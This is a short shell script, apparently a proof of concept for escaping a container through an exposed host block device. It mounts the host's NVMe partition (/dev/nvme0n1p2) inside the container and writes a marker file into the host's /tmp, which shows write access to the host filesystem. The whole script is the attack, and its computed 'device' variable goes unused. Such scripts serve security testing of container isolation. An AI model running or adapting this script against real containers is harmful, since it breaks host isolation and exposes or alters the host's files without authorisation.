#!/bin/sh
device=`lsblk | grep part | tail -1 | awk '{print $1}' | awk -F- '{print $2}'`
#mknod /dev/nvme0n1p2 block 259 2 
mkdir /mnt/host_home
mount /dev/nvme0n1p2 /mnt/host_home
touch /mnt/host_home/tmp/container-escape-exposed_block_device.txt
